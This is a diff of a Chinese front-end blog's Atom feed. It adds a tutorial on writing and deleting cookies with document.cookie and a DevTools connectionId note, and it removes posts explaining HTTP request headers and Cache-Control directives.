+<p><code>document.cookie</code>属性是可写的，可以通过它为当前网站添加 Cookie。</p>
+<pre><code class="language-js">document.cookie = 'fontSize=14';
+</code></pre>
+<p>写入的时候，Cookie 的值必须写成<code>key=value</code>的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用<code>encodeURIComponent</code>方法达到。</p>
+<p>但是，<code>document.cookie</code>一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。</p>
+<pre><code class="language-js">document.cookie = 'test1=hello';
+document.cookie = 'test2=world';
+document.cookie
+// test1=hello;test2=world
+</code></pre>
+<p><code>document.cookie</code>读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，<code>Cookie</code>字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，<code>Set-Cookie</code>字段是一行设置一个 Cookie。</p>
+<p>写入 Cookie 的时候，可以一起写入 Cookie 的属性。</p>
+<pre><code class="language-js">document.cookie = &quot;foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT&quot;;
+</code></pre>
+<p>上面代码中，写入 Cookie 的时候，同时设置了<code>expires</code>属性。属性值的等号两边，也是不能有空格的。</p>
+<p>各个属性的写入注意点如下。</p>
+<ul>
+<li><code>path</code>属性必须为绝对路径，默认为当前路径。</li>
+<li><code>domain</code>属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是<code>example.com</code>，就不能将其设为<code>foo.com</code>。该属性默认为当前的一级域名（不含二级域名）。</li>
+<li><code>max-age</code>属性的值为秒数。</li>
+<li><code>expires</code>属性的值为 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行日期格式转换。</li>
+</ul>
+<p><code>document.cookie</code>写入 Cookie 的例子如下。</p>
+<pre><code class="language-js">document.cookie = 'fontSize=14; '
+  + 'expires=' + someDate.toGMTString() + '; '
+  + 'path=/subdirectory; '
+  + 'domain=*.example.com';
+</code></pre>
+<p>Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。</p>
+<p>删除一个现存 Cookie 的唯一方法，是设置它的<code>expires</code>属性为一个过去的日期。</p>
+<pre><code class="language-js">document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
+</code></pre>
+<p>上面代码中，名为<code>fontSize</code>的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。</p>
+<h2 id="特点">特点</h2>
+<h3 id="不可跨域">不可跨域</h3>
+<p>每个 cookie 都会绑定单一的域名，无法在别的域名下获取使用</p>
+<p><strong>一级域名和二级域名之间是允许共享使用的</strong>（<strong>靠的是 domain）</strong>。</p>
+<h2 id="转载">转载</h2>
+<blockquote>
+<p>阮一峰</p>
+<p><a href="https://javascript.ruanyifeng.com/bom/cookie.html">https://javascript.ruanyifeng.com/bom/cookie.html</a></p>
+</blockquote>
+<h2 id="推荐阅读">推荐阅读</h2>
+<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">MDN/HTTP/Cookies</a></p>
+<p><a href="https://juejin.cn/post/6898630134530752520">前端鉴权的兄弟们：cookie、session、token、jwt、单点登录</a></p>
+<p><a href="https://juejin.cn/post/6844904034181070861">傻傻分不清之 Cookie、Session、Token、JWT</a></p>
+<p><a href="https://juejin.cn/post/6844903812092674061">深入了解浏览器存储--从cookie到WebStorage、IndexedDB</a></p>
+<p><a href="https://juejin.cn/post/6914109129267740686">面试不再怕：史上最全的cookie知识点详解</a></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[http-缓存验证]]></title>
         <id>https://leecss.com/post/http-huan-cun-yan-zheng/</id>
@@ -101,6 +581,20 @@ console.log('server listening on 8888')
 <h3 id="network">Network</h3>
 <p>1、Disable cache</p>
 <p>当勾选了Disable cache，浏览器发送http请求就不会再发送缓存相关的请求头，比如If-Modified-Since、If-None-Match等，即不再使用缓存。</p>
+<p>2、connectionId</p>
+<p>在name状态栏那一行右击，可以勾选要显示和隐藏的列，选择显示connectionId</p>
+<blockquote>
+<p><code>connectionId</code> is the unique identifier of the connection used for that query/TCP connection etc. It's a way of evaluating which resources are using which connection.</p>
+<p>connectionId是用于该查询/TCP连接等的连接的唯一标识符。它是一种评估哪些资源正在使用哪个连接的方法。</p>
+</blockquote>
+<p>For example:</p>
+<pre><code>Name      Connection ID    (TCP Handshake / Reused Connection)
+foo.jpg   72218            Handshake
+bar.jpg   72218            Reused
+cat.jpg   79146            Handshake
+baz.jpg   72218            Reused
+dog.jpg   79146            Reused
+</code></pre>
 ]]></content>
     </entry>
     <entry>
@@ -1551,650 +2045,6 @@ Server: Apache/2.2.6 (Unix) PHP/5.2.5
 <pre><code class="language-http">WWW-Authenticate: Basic realm=&quot;Usagidesign Auth&quot;
 </code></pre>
 <p>上述示例中，realm 字段的字符串是为了辨别请求 URI 指定资源所受到的保护策略。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[http-请求首部字段]]></title>
-        <id>https://leecss.com/post/http-qing-qiu-shou-bu-zi-duan/</id>
-        <link href="https://leecss.com/post/http-qing-qiu-shou-bu-zi-duan/">
-        </link>
-        <updated>2021-07-20T15:43:16.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
-<p>请求首部字段是从客户端往服务器端发送请求报文中所使用的字段，用于补充请求的附加信息、客户端信息、对响应内容相关的优先级等内容。</p>
-<h2 id="列表">列表</h2>
-<table>
-<thead>
-<tr>
-<th>请求首部</th>
-<th>作用（请求报文专用）</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Accept</td>
-<td>能正确接收的媒体类型：<code>application/json</code> <code>text/plain</code></td>
-</tr>
-<tr>
-<td>Accept-Charset</td>
-<td>能正确接收的字符集: <code>unicode-1-1</code></td>
-</tr>
-<tr>
-<td>Accept-Encoding</td>
-<td>能正确接收的内容编码格式列表：<code>gzip deflate</code></td>
-</tr>
-<tr>
-<td>Accept-Language</td>
-<td>能正确接收的语言列表：<code>zh-cn,zh;1=0.9,en,1=0.8</code></td>
-</tr>
-<tr>
-<td>Authorization</td>
-<td>客户端认证信息：<code>Bearer dSdSdFFlsfdjasd123</code>，一般存token用</td>
-</tr>
-<tr>
-<td>Expect</td>
-<td>指定期望条件，并告知服务器只有在满足此期望条件的情况下才能妥善地处理请求。</td>
-</tr>
-<tr>
-<td>From</td>
-<td>请求方邮箱地址</td>
-</tr>
-<tr>
-<td>Host</td>
-<td>服务器的域名，用于区分单台服务器多个域名的虚拟主机，是HTTP/1.1唯一必须包含的字段。</td>
-</tr>
-<tr>
-<td>If-Match</td>
-<td>服务器会比对 If-Match 的字段值和资源的 ETag 值，仅当两者一致时，才会执行请求</td>
-</tr>
-<tr>
-<td>If-None-Match</td>
-<td>服务器会比对 If-Match 的字段值和资源的 ETag 值，当两者不一致时，执行请求</td>
-</tr>
-<tr>
-<td>If-Modified-Since</td>
-<td>服务器只在所请求的资源在 If-Modified-Since 给定的日期时间之后对内容进行过修改的情况下才会将资源返回</td>
-</tr>
-<tr>
-<td>If-Unmodified-Since</td>
-<td>服务器只在所请求的资源在 If-Modified-Since 给定的日期时间之后对内容未进行过修改的情况下才会将资源返回</td>
-</tr>
-<tr>
-<td>If-Range</td>
-<td>该字段与Range字段配合使用，If-Range字段值中的条件得到满足时，Range 头字段才会起作用</td>
-</tr>
-<tr>
-<td>Max-Forwards</td>
-<td>限制可被代理及网关转发的次数</td>
-</tr>
-<tr>
-<td>Proxy-Authorization</td>
-<td>向代理服务器发送验证信息</td>
-</tr>
-<tr>
-<td>Range</td>
-<td>请求某个内容的一部分，配合<code>If-Range</code>使用</td>
-</tr>
-<tr>
-<td>Referer</td>
-<td>请求发起页面的原始URI</td>
-</tr>
-<tr>
-<td>TE</td>
-<td>传输编码方式</td>
-</tr>
-<tr>
-<td>User-Agent</td>
-<td>客户端信息</td>
-</tr>
-</tbody>
-</table>
-<h3 id="accept">Accept</h3>
-<p>Accept 首部字段可通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。可使用 type/subtype 这种形式，一次指定多种媒体类型。</p>
-<pre><code>文本文件
-text/html, text/plain, text/css ...
-application/xhtml+xml, application/xml ...
-
-图片文件
-image/jpeg, image/gif, image/png ...
-
-视频文件
-video/mpeg, video/quicktime ...
-
-应用程序使用的二进制文件
-application/octet-stream, application/zip ...
-</code></pre>
-<p>比如，如果浏览器不支持 PNG 图片的显示，那 Accept 就不指定image/png，而指定可处理的 image/gif 和 image/jpeg 等图片类型。<br>
-若想要给显示的媒体类型增加优先级，则使用 q= 来额外表示权重值，用分号（;）进行分隔。权重值 q 的范围是 0~1（可精确到小数点后 3 位），且 1 为最大值。不指定权重 q 值时，默认权重为 q=1.0。</p>
-<pre><code class="language-http">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/png,*/*;q=0.8
-</code></pre>
-<h3 id="accept-charset">Accept-Charset</h3>
-<p>Accept-Charset 首部字段可用来通知服务器用户代理支持的字符集及字符集的相对优先顺序。另外，可一次性指定多种字符集。与首部字段 Accept 相同的是可用权重 q 值来表示相对优先级。</p>
-<pre><code class="language-http">Accept-Charset: iso-8859-5, unicode-1-1;q=0.8
-</code></pre>
-<h3 id="accept-encoding">Accept-Encoding</h3>
-<p>Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指定多种内容编码。</p>
-<pre><code>gzip
-由文件压缩程序 gzip（GNU zip）生成的编码格式（RFC1952），采用 Lempel-Ziv 算法（LZ77）及 32 位循环冗余校验（Cyclic Redundancy Check，通称 CRC）。
-
-compress
-由 UNIX 文件压缩程序 compress 生成的编码格式，采用 LempelZiv-Welch 算法（LZW）。
-
-deflate
-组合使用 zlib 格式（RFC1950）及由 deflate 压缩算法（RFC1951）生成的编码格式。
-
-identity
-不执行压缩或不会变化的默认编码格式
-</code></pre>
-<p>采用权重 q 值来表示相对优先级，这点与首部字段 Accept 相同。另外，也可使用星号（*）作为通配符，指定任意的编码格式。</p>
-<pre><code class="language-http">Accept-Encoding: gzip, deflate
-</code></pre>
-<h3 id="accept-language">Accept-Language</h3>
-<p>首部字段 Accept-Language 用来告知服务器用户代理能够处理的自然语言集（指中文或英文等），以及自然语言集的相对优先级。可一次指定多种自然语言集。<br>
-和 Accept 首部字段一样，按权重值 q 来表示相对优先级。客户端在服务器有中文版资源的情况下，会请求其返回中文版对应的响应，没有中文版时，则请求返回英文版响应。</p>
-<pre><code class="language-http">Accept-Language: zh-cn,zh;q=0.7,en-us,en;q=0.3
-</code></pre>
-<h3 id="authorization">Authorization</h3>
-<p>首部字段 Authorization 是用来告知服务器，用户代理的认证信息（证书值）。通常，想要通过服务器认证的用户代理会在接收到返回的401 状态码响应后，把首部字段 Authorization 加入请求中。共用缓存在接收到含有 Authorization 首部字段的请求时的操作处理会略有差异。</p>
-<pre><code class="language-http">Authorization: Basic dWVub3NlbjpwYXNzd29yZA==
-</code></pre>
-<h3 id="expect">Expect</h3>
-<p>客户端使用首部字段 Expect 来告知服务器，期望出现的某种特定行为。</p>
-<p>等待状态码 100 响应的客户端在发生请求时，需要指定 Expect:100-continue。</p>
-<p>客户端可以利用该首部字段，写明所期望的扩展。虽然 HTTP/1.1 规范只定义了 100-continue（状态码 100 Continue 之意）。</p>
-<pre><code class="language-http">Expect: 100-continue
-</code></pre>
-<p>返回100表示请求头中的期望条件可以得到满足</p>
-<p>因服务器无法理解客户端的期望作出回应而发生错误时，会返回状态码 417 Expectation Failed。</p>
-<h3 id="from">From</h3>
-<p>首部字段 From 用来告知服务器使用用户代理的用户的电子邮件地址。通常，其使用目的就是为了显示搜索引擎等用户代理的负责人的电子邮件联系方式。使用代理时，应尽可能包含 From 首部字段（但可能会因代理不同，将电子邮件地址记录在 User-Agent 首部字段内）。</p>
-<pre><code class="language-http">From: webmaster@example.org
-</code></pre>
-<h3 id="host">Host</h3>
-<p>首部字段 Host 会告知服务器，请求的资源所处的互联网主机名和端口号。<u>Host 首部字段在 HTTP/1.1 规范内是唯一一个必须被包含在请求内的首部字段。</u></p>
-<pre><code class="language-http">Host: www.hackr.jp
-</code></pre>
-<p>首部字段 Host 和以单台服务器分配多个域名的虚拟主机的工作机制有很密切的关联，这是首部字段 Host 必须存在的意义。</p>
-<p>请求被发送至服务器时，请求中的主机名会用 IP 地址直接替换解决。但如果这时，相同的 IP 地址下部署运行着多个域名，那么服务器就会无法理解究竟是哪个域名对应的请求。因此，就需要使用首部字段 Host 来明确指出请求的主机名。若服务器未设定主机名，那直接发送一个空值即可。如下所示。</p>
-<pre><code class="language-http">Host:
-</code></pre>
-<h3 id="if-match">If-Match</h3>
-<p>形如 If-xxx 这种样式的请求首部字段，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。</p>
-<pre><code class="language-http">If-Match: &quot;123456&quot;
-</code></pre>
-<p>首部字段 If-Match，属附带条件之一，它会告知服务器匹配资源所用的实体标记（ETag）值。这时的服务器无法使用弱 ETag 值。</p>
-<p>服务器会比对 If-Match 的字段值和资源的 ETag 值，仅当两者一致时，才会执行请求。反之，则返回状态码 412 Precondition Failed 的响应。</p>
-<p>ETag 之间的比较使用的是强比较算法，即只有在每一个字节都相同的情况下，才可以认为两个文件是相同的。在 ETag 前面添加 W/ 前缀表示可以采用相对宽松的算法。</p>
-<p>还可以使用星号（*）指定 If-Match 的字段值。针对这种情况，服务器将会忽略 ETag 的值，只要资源存在就处理请求。</p>
-<pre><code class="language-http">If-Match: &quot;bfc13a64729c4290ef5b2c2730249c88ca92d82d&quot;
-If-Match: W/&quot;67ab43&quot;, &quot;54ed21&quot;, &quot;7892dd&quot;
-If-Match: *
-</code></pre>
-<h3 id="if-none-match">If-None-Match</h3>
-<p>首部字段 If-None-Match 属于附带条件之一。它和首部字段 If-Match作用相反。用于指定 If-None-Match 字段值的实体标记（ETag）值与请求资源的 ETag 不一致时，它就告知服务器处理该请求。</p>
-<p>在 GET 或 HEAD 方法中使用首部字段 If-None-Match 可获取最新的资源。因此，这与使用首部字段 If-Modified-Since 时有些类似。</p>
-<pre><code class="language-http">If-None-Match: &quot;bfc13a64729c4290ef5b2c2730249c88ca92d82d&quot;
-If-None-Match: W/&quot;67ab43&quot;, &quot;54ed21&quot;, &quot;7892dd&quot;
-If-None-Match: *
-</code></pre>
-<h3 id="if-modified-since">If-Modified-Since</h3>
-<p>首部字段 If-Modified-Since，属附带条件之一，它会告知服务器若 IfModified-Since 字段值早于资源的更新时间，则希望能处理该请求。而在指定 If-Modified-Since 字段值的日期时间之后，如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应。</p>
-<p>If-Modified-Since 用于确认代理或客户端拥有的本地资源的有效性。获取资源的更新日期时间，可通过确认首部字段 Last-Modified 来确定。</p>
-<pre><code class="language-http">If-Modified-Since: Thu, 15 Apr 2004 00:00:00 GMT
-</code></pre>
-<h3 id="if-unmodified-since">If-Unmodified-Since</h3>
-<p>首部字段 If-Unmodified-Since 和首部字段 If-Modified-Since 的作用相反。它的作用的是告知服务器，指定的请求资源只有在字段值内指定的日期时间之后，未发生更新的情况下，才能处理请求。如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。</p>
-<pre><code class="language-http">If-Unmodified-Since: Thu, 03 Jul 2012 00:00:00 GMT
-</code></pre>
-<h3 id="if-range">If-Range</h3>
-<p>该字段与Range字段配合使用，If-Range字段值中的条件得到满足时，Range 头字段才会起作用</p>
-<p>首部字段 If-Range 属于附带条件之一。它告知服务器若指定的 If-Range 字段值（ETag 值或者时间）和请求资源的 ETag 值或时间相一致时，则作为范围请求处理。反之，则返回全体资源。</p>
-<p>下面我们思考一下不使用首部字段 If-Range 发送请求的情况。服务器端的资源如果更新，那客户端持有资源中的一部分也会随之无效，当然，范围请求作为前提是无效的。这时，服务器会暂且以状态码 412Precondition Failed 作为响应返回，其目的是催促客户端再次发送请求。这样一来，与使用首部字段 If-Range 比起来，就需要花费两倍的功夫。</p>
-<pre><code class="language-http">GET /index.html
-If-Range: &quot;123456&quot;
-Range: bytes=5001-10000
-</code></pre>
-<h3 id="max-forwards">Max-Forwards</h3>
-<p>通过 TRACE 方法或 OPTIONS 方法，发送包含首部字段 MaxForwards 的请求时，该字段以十进制整数形式指定可经过的服务器最大数目。服务器在往下一个服务器转发请求之前，Max-Forwards 的值减 1 后重新赋值。当服务器接收到 Max-Forwards 值为 0 的请求时，则不再进行转发，而是直接返回响应。</p>
-<p>使用 HTTP 协议通信时，请求可能会经过代理等多台服务器。途中，如果代理服务器由于某些原因导致请求转发失败，客户端也就等不到服务器返回的响应了。对此，我们无从可知。</p>
-<p>可以灵活使用首部字段 Max-Forwards，针对以上问题产生的原因展开调查。由于当 Max-Forwards 字段值为 0 时，服务器就会立即返回响应，由此我们至少可以对以那台服务器为终点的传输路径的通信状况有所把握。</p>
-<pre><code class="language-http">Max-Forwards: 10
-</code></pre>
-<h3 id="proxy-authorization">Proxy-Authorization</h3>
-<p>接收到从代理服务器发来的认证质询时，客户端会发送包含首部字段Proxy-Authorization 的请求，以告知服务器认证所需要的信息。</p>
-<p>这个行为是与客户端和服务器之间的 HTTP 访问认证相类似的，不同之处在于，认证行为发生在客户端与代理之间。客户端与服务器之间的认证，使用首部字段 Authorization 可起到相同作用。</p>
-<pre><code class="language-http">Proxy-Authorization: Basic dGlwOjkpNLAGfFY5
-</code></pre>
-<h3 id="range">Range</h3>
-<pre><code class="language-http">Range: bytes=5001-10000
-</code></pre>
-<p>对于只需获取部分资源的范围请求，包含首部字段 Range 即可告知服务器资源的指定范围。上面的示例表示请求获取从第 5001 字节至第10000 字节的资源。</p>
-<p>接收到附带 Range 首部字段请求的服务器，会在处理请求之后返回状态码为 206 Partial Content 的响应。无法处理该范围请求时，则会返回状态码 200 OK 的响应及全部资源。</p>
-<h3 id="referer">Referer</h3>
-<p>首部字段 Referer 会告知服务器请求的原始资源的 URI。</p>
-<p>客户端一般都会发送 Referer 首部字段给服务器。但当直接在浏览器的地址栏输入 URI，或出于安全性的考虑时，也可以不发送该首部字段。</p>
-<p>因为原始资源的 URI 中的查询字符串可能含有 ID 和密码等保密信息，要是写进 Referer 转发给其他服务器，则有可能导致保密信息的泄露。</p>
-<p>另外，Referer 的正确的拼写应该是 Referrer，但不知为何，大家一直沿用这个错误的拼写。</p>
-<pre><code class="language-http">Referer: http://www.hackr.jp/index.htm
-</code></pre>
-<h3 id="te">TE</h3>
-<pre><code class="language-http">TE: gzip, deflate;q=0.5
-</code></pre>
-<p>首部字段 TE 会告知服务器客户端能够处理响应的传输编码方式及相对优先级。它和首部字段 Accept-Encoding 的功能很相像，但是用于传输编码。</p>
-<p><u>TE是用于传输编码，而Accept-Encoding用于内容编码。</u></p>
-<p>首部字段 TE 除指定传输编码之外，还可以指定伴随 trailer 字段的分块传输编码的方式。应用后者时，只需把 trailers 赋值给该字段值。</p>
-<pre><code class="language-http">TE: trailers
-</code></pre>
-<h3 id="user-agent">User-Agent</h3>
-<p>User-Agent 用于传达浏览器的种类</p>
-<p>首部字段 User-Agent 会将创建请求的浏览器和用户代理名称等信息传达给服务器。</p>
-<p>由网络爬虫发起请求时，有可能会在字段内添加爬虫作者的电子邮件地址。此外，如果请求经过代理，那么中间也很可能被添加上代理服务器的名称。</p>
-<pre><code class="language-http">User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36 Name
-</code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[http-通用首部字段Cache-Control]]></title>
-        <id>https://leecss.com/post/http-tong-yong-shou-bu-zi-duan-cache-control/</id>
-        <link href="https://leecss.com/post/http-tong-yong-shou-bu-zi-duan-cache-control/">
-        </link>
-        <updated>2021-07-19T15:35:46.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="http-通用首部字段cache-control">http-通用首部字段Cache-Control</h1>
-<h2 id="概述">概述</h2>
-<p>通过指定首部字段 Cache-Control 的指令，就能操作缓存的工作机制。</p>
-<h2 id="书写格式">书写格式</h2>
-<p>指令的参数是可选的，多个指令之间通过“,”分隔。首部字段 CacheControl 的指令可用于请求及响应时。</p>
-<pre><code>Cache-Control: private, max-age=0, no-cache
-</code></pre>
-<h2 id="分类">分类</h2>
-<h3 id="缓存请求指令">缓存请求指令</h3>
-<table>
-<thead>
-<tr>
-<th>指令</th>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>no-cache</td>
-<td>无</td>
-<td>不使用缓存，缓存服务器必须把客户端请求转发给源服务器，在与源服务器进行新鲜度再验证之前，不能提供给客户端使用。</td>
-</tr>
-<tr>
-<td>no-store</td>
-<td>无</td>
-<td>真正的不使用缓存，任何地方都不缓存请求或响应的任何内容。</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>max-age=60</td>
-<td>必需</td>
-<td>资源可缓存最大时间(相对时间：秒)，即过期时间、保质期。</td>
-</tr>
-<tr>
-<td>max-stale=60</td>
-<td>可省略</td>
-<td>缓存资源，只要仍处于 max-stale指定的时间(秒)内，即使过期也照常接收。缓存总时长为max-age和max-stale叠加。</td>
-</tr>
-<tr>
-<td>min-fresh=60</td>
-<td>必需</td>
-<td>期望在指定时间内(未来60秒内)的响应保持新鲜</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>no-transform</td>
-<td>无</td>
-<td>代理不可更改媒体类型</td>
-</tr>
-<tr>
-<td>only-if-cached</td>
-<td>无</td>
-<td>只从缓存获取资源，若有则返回，若无则504</td>
-</tr>
-</tbody>
-</table>
-<h3 id="缓存响应指令">缓存响应指令</h3>
-<table>
-<thead>
-<tr>
-<th>指令</th>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>no-cache</td>
-<td>无</td>
-<td>缓存前必须先确认其有效性</td>
-</tr>
-<tr>
-<td>no-store</td>
-<td>无</td>
-<td>不缓存请求或响应的任何内容</td>
-</tr>
-<tr>
-<td>public</td>
-<td>无</td>
-<td>客户端、代理服务器都可利用缓存</td>
-</tr>
-<tr>
-<td>private</td>
-<td>无</td>
-<td>仅发起请求的客户端可利用缓存</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>max-age=60</td>
-<td>必需</td>
-<td>针对源服务器，资源可缓存最大时间</td>
-</tr>
-<tr>
-<td>s-maxage=60</td>
-<td>必需</td>
-<td>针对代理缓存服务器，资源可缓存最大时间</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>must-revalidate</td>
-<td>无</td>
-<td>可缓存但必须再向源服务器进行确认</td>
-</tr>
-<tr>
-<td>proxy-revalidate</td>
-<td>无</td>
-<td>代理缓存服务器对缓存的响应有效性再进行确认</td>
-</tr>
-<tr>
-<td>no-transform</td>
-<td>无</td>
-<td>代理不可更改媒体类型</td>
-</tr>
-</tbody>
-</table>
-<h2 id="详解">详解</h2>
-<h3 id="no-cache">no-cache</h3>
-<p>使用 no-cache 指令的目的是为了防止从缓存中返回过期的资源。</p>
-<p><strong>客户端</strong>发送的请求中如果包含 no-cache 指令，则表示客户端将不会接收缓存过的响应。于是，“中间”的缓存服务器必须把客户端请求转发给源服务器。</p>
-<p>如果<strong>服务器</strong>返回的响应中包含 no-cache 指令，那么缓存服务器不能对资源进行缓存。源服务器以后也将不再对缓存服务器请求中提出的资源有效性进行确认，且禁止其对响应资源进行缓存操作。</p>
-<pre><code>Cache-Control: no-cache
-</code></pre>
-<p>如果可以使用缓存，则304；不可以使用，则200。</p>
-<h3 id="max-age">max-age</h3>
-<p>当<strong>客户端</strong>发送的请求中包含 max-age 指令时，如果判定缓存资源的缓存时间数值比指定时间的数值更小，那么客户端就接收缓存的资源。<br>
-另外，<u>当指定 max-age 值为 0，那么缓存服务器通常需要将请求转发给源服务器</u>。</p>
-<p>当<strong>服务器</strong>返回的响应中包含 max-age 指令时，缓存服务器将不对资源的有效性再作确认，而 max-age 数值代表资源保存为缓存的最长时间。</p>
-<pre><code>Cache-Control: max-age=604800（单位：秒）
-</code></pre>
-<p><strong>问题</strong></p>
-<p>有一个问题 catch-control 是客户端缓存，当max-age 之内，服务端更新了数据，客户端是不能知道的。</p>
-<p>这个问题，前端的一种常用的解决方案是，将打包的js文件名加入一段哈希码，当打包内容不变时，哈希码就不变。这样子，当内容不变时，请求的url 也就不变，当内容变了请求的url 也变了。这样就达到了更新缓存的目的。</p>
-<h3 id="min-fresh">min-fresh</h3>
-<p>min-fresh 指令要求缓存服务器返回至少还未过指定时间的缓存资源。</p>
-<p>比如，当指定 min-fresh 为 60 秒后，过了 60 秒的资源都无法作为响应返回了。</p>
-<pre><code>Cache-Control: min-fresh=60（单位：秒）
-</code></pre>
-<h3 id="max-stale">max-stale</h3>
-<p>使用 max-stale 可指示缓存资源，即使过期也照常接收。</p>
-<p>如果指令中指定了具体数值，那么即使过期，只要仍处于 max-stale指定的时间内，仍旧会被客户端接收。</p>
-<p><u>如果指令未指定参数值，那么无论经过多久，客户端都会接收响应；</u></p>
-<pre><code>Cache-Control: max-stale=3600（单位：秒）
-</code></pre>
-<h3 id="only-if-cached">only-if-cached</h3>
-<p>使用 only-if-cached 指令表示客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回。换言之，该指令要求缓存服务器不重新加载响应，也不会再次确认资源有效性。若发生请求缓存服务器的本地缓存无响应，则返回状态码 504 Gateway Timeout。</p>
-<pre><code>Cache-Control: only-if-cached
-</code></pre>
-<h3 id="must-revalidate">must-revalidate</h3>
-<p>使用 must-revalidate 指令，代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。</p>
-<p>若代理无法连通源服务器再次获取有效资源的话，缓存必须给客户端一条 504（Gateway Timeout）状态码。</p>
-<p>另外，使用 must-revalidate 指令会忽略请求的 max-stale 指令（即使已经在首部使用了 max-stale，也不会再有效果）。</p>
-<pre><code>Cache-Control: must-revalidate
-</code></pre>
-<h3 id="proxy-revalidate">proxy-revalidate</h3>
-<p>proxy-revalidate 指令要求所有的缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性。</p>
-<pre><code>Cache-Control: proxy-revalidate
-</code></pre>
-<h3 id="no-transform">no-transform</h3>
-<p>有时为了提高性能，缓存或代理会有压缩图片等类似操作</p>
-<p>使用 no-transform 指令规定无论是在请求还是响应中，缓存都不能改变实体主体的媒体类型。<br>
-这样做可防止缓存或代理压缩图片等类似操作</p>
-<h2 id="浏览器缓存机制">浏览器缓存机制</h2>
-<p>以下总结自<a href="https://blog.csdn.net/kkdelta/article/details/100576096">网络</a>，以后确认具体过程。</p>
-<p>1、当前缓存是否过期？2、服务器中的文件是否可用？</p>
-<p><strong>第一步：判断当前缓存是否过期</strong></p>
-<p>浏览器请求server.js文件，</p>
-<p>假如文件还在缓存有效期内，则直接使用缓存，不会重新发起请求。</p>
-<p>假如文件缓存过期，则重新发起请求。</p>
-<p><strong>第二步：判断服务器中的文件是否可用</strong></p>
-<p>服务器判断请求的server.js文件是否在缓存有效期内，若有效，则返回响应头304，浏览器直接使用过期缓存；</p>
-<p>若文件已过期，服务器判断文件是否有改动，无改动，则返回响应头304，浏览器直接使用过期缓存；</p>
-<p>若文件有改动，则返回200，并返回新文件。</p>
-<h2 id="cache-control使用图解">cache-control使用图解</h2>
-<figure data-type="image" tabindex="1"><img src="https://leecss.com/post-images/1626740943823.webp" alt="" loading="lazy"></figure>
-<h2 id="目前仍有的疑问">目前仍有的疑问</h2>
-<p>1、缓存总时长为max-age和max-stale叠加，取值为相加值，还是最大值？</p>
-<p>2、must-revalidate和proxy-revalidate区别？</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[http-通用首部字段]]></title>
-        <id>https://leecss.com/post/http-tong-yong-shou-bu-zi-duan/</id>
-        <link href="https://leecss.com/post/http-tong-yong-shou-bu-zi-duan/">
-        </link>
-        <updated>2021-07-18T23:08:49.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
-<p>通用首部字段是指，请求报文和响应报文双方都会使用的首部。</p>
-<h2 id="列表">列表</h2>
-<table>
-<thead>
-<tr>
-<th>通用首部</th>
-<th>作用（请求报文和响应报文都可能使用）</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Cache-Control</td>
-<td>控制缓存的行为</td>
-</tr>
-<tr>
-<td>Connection</td>
-<td>管理持久连接：决定当前的事务完成后，是否会关闭网络连接</td>
-</tr>
-<tr>
-<td>Date</td>
-<td>创建报文时间</td>
-</tr>
-<tr>
-<td>Pragma</td>
-<td>兼容HTTP/1.0字段：只用于请求报文，客户端要求中间服务器不返回缓存的资源</td>
-</tr>
-<tr>
-<td>Trailer</td>
-<td>允许发送方在分块发送的消息后面添加额外的元信息，常用于分块传输编码中。</td>
-</tr>
-<tr>
-<td>Transfer-Encoding</td>
-<td>规定了传输报文主体时采用的编码方式：<code>chunked</code>分块传输</td>
-</tr>
-<tr>
-<td>Upgrade</td>
-<td>要求客户端使用的升级协议，需配合<code>Connection: Upgrade</code>一起使用：<code>websocket</code></td>
-</tr>
-<tr>
-<td>Via</td>
-<td>代理服务器相关信息，每经过一个代理服务器就会添加相关信息，用逗号分割</td>
-</tr>
-<tr>
-<td>Warning</td>
-<td>缓存相关问题的警告</td>
-</tr>
-</tbody>
-</table>
-<h3 id="cache-control">Cache-Control</h3>
-<p>可缓存性</p>
